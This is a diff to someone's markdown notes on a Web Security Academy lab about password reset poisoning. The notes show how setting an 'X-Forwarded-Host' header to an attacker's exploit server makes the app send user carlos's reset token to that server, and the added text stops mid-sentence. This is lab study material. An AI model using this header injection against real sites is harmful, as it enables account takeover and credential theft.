@@ -189,11 +189,13 @@ Explore the password reset functionality fully by changing the password of a kno
 	- add the following ->  `X-Forwarded-Host: donotput_https://_here`
 	- replace `donotput_https://_here` w exploit server link. The link should be a server where u have access to logs 
 
-
 | With the `X-Forwarded-Host`                                                                                 | Without the `X-Forwarded-Host`                                                                   |
 | ----------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------ |
 | `https://exploit-server-fsd7903dawd3rfeas.exploit-server.net/forgot-password?temp-forgot-pass-token=ewf...` | `https://0aec007903dawd3r.websecurity-academy.net/forgot-password?temp-forgot-pass-token=ewf...` |
-|                                                                                                             |                                                                                                  |
+when we add the header we say Hey listen the host is not that one (origin header) it's this one over here which is equal to our Exploit server. What it did is that the application automatically trusted that this is the host and it generated the temporary forgot password token and it appended it to what it thinks is the host of the application however this is our exploit server.
+
+when we change the parameter to carlos and hit send. An email is send to the user carlos, the user clicks the email and when we check the access logs of our exploit server, 
+
 
 ### References 
 
